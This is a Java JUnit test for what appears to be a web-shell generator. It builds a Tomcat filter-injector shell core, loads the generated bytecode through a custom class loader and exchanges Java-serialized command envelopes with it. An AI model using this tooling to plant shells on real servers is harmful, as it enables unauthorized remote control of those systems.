package org.leo.jmg;

import org.junit.jupiter.api.Test;
import org.leo.core.entity.Disguise;
import org.leo.jmg.core.LeoCore;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

class EnvelopeCoreCompatibilityTest {

    @Test
    void generatedCoreExecutesEnvelopeRequest() throws Exception {
        Disguise request = new Disguise();
        request.setDecodeBody("public java.util.HashMap decode(byte[] data) throws Exception {"
                + "java.io.ObjectInputStream in=new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(data));"
                + "return (java.util.HashMap)in.readObject();}");
        Disguise response = new Disguise();
        response.setEncodeBody("public byte[] encode(java.util.HashMap data) throws Exception {"
                + "java.io.ByteArrayOutputStream out=new java.io.ByteArrayOutputStream();"
                + "java.io.ObjectOutputStream stream=new java.io.ObjectOutputStream(out);"
                + "stream.writeObject(data);stream.close();return out.toByteArray();}");
        ShellGeneratorConfig config = ShellGeneratorConfig.builder(request, response)
                .coreClassName("org.example.EnvelopeCore")
                .shellClassName("org.example.EnvelopeShell")
                .injectorClassName("org.example.EnvelopeInjector")
                .header("X-Test", "envelope")
                .serverType("Tomcat")
                .shellType("FilterInjector")
                .packerType("DefaultBase64")
                .build();
        byte[] bytecode = new LeoCore(request, response)
                .genLeoCoreByClassName(config.getCoreClassName(), config);
        Object core = new Loader().define(bytecode).getDeclaredConstructor().newInstance();

        Map<String, Object> envelope = new HashMap<>();
        envelope.put("requestId", "request-1");
        envelope.put("operation", "PING");
        envelope.put("params", new HashMap<>());
        Map<String, Object> envelopeResponse = invoke(core, envelope);
        assertEquals("request-1", envelopeResponse.get("requestId"));
        assertEquals(200, envelopeResponse.get("code"));
        assertTrue(envelopeResponse.get("data") instanceof Map<?, ?>);
        assertTrue(((Map<?, ?>) envelopeResponse.get("data")).containsKey("hostId"));

        String actualHostId = String.valueOf(((Map<?, ?>) envelopeResponse.get("data")).get("hostId"));
        Map<String, Object> wrongHostRequest = new HashMap<>();
        wrongHostRequest.put("requestId", "request-2");
        wrongHostRequest.put("operation", "COMPONENT_INVOKE");
        wrongHostRequest.put("hostId", "wrong-" + actualHostId);
        wrongHostRequest.put("component", "MissingComponent");
        wrongHostRequest.put("action", "run");
        wrongHostRequest.put("params", new HashMap<>());

        Map<String, Object> mismatch = invoke(core, wrongHostRequest);
        assertEquals(409, mismatch.get("code"));
        assertTrue(mismatch.get("error") instanceof Map<?, ?>);
        Map<?, ?> error = (Map<?, ?>) mismatch.get("error");
        assertEquals("HOST_ID_MISMATCH", error.get("errorCode"));
        assertEquals(actualHostId, error.get("hostId"));
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> invoke(Object core, Map<String, Object> request) throws Exception {
        ByteArrayOutputStream wire = new ByteArrayOutputStream();
        ObjectOutputStream output = new ObjectOutputStream(wire);
        output.writeObject(request);
        output.close();
        core.equals(wire);
        ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(wire.toByteArray()));
        return (Map<String, Object>) input.readObject();
    }

    private static final class Loader extends ClassLoader {
        private Class<?> define(byte[] bytecode) {
            return defineClass(null, bytecode, 0, bytecode.length);
        }
    }
}
